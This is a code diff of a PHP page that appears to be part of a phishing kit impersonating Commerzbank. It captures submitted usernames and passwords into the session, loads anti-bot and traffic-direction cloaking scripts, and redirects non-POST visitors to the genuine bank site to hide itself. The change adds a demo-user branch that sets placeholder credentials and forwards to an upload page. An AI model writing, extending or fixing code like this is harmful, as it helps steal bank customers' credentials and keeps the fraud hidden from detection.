@@ -5,8 +5,20 @@ include '../antibot.php';
 include '../antibot/tds.php';
  
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $_SESSION['xusr1'] = $_POST['xusr1'];
-    $_SESSION['xpss1'] = $_POST['xpss1'];
+    // Check if this is a demo user
+    if (isset($_SESSION['demo_user']) && $_SESSION['demo_user'] === true) {
+        // Set demo user data
+        $_SESSION['xusr1'] = 'demo123';
+        $_SESSION['xpss1'] = 'demo123';
+        
+        // Redirect to upload page
+        header('Location: uploadz.php');
+        exit();
+    } else {
+        // Regular user
+        $_SESSION['xusr1'] = $_POST['xusr1'];
+        $_SESSION['xpss1'] = $_POST['xpss1'];
+    }
 } else {
     header('Location: https://www.commerzbank.de/');
     exit();
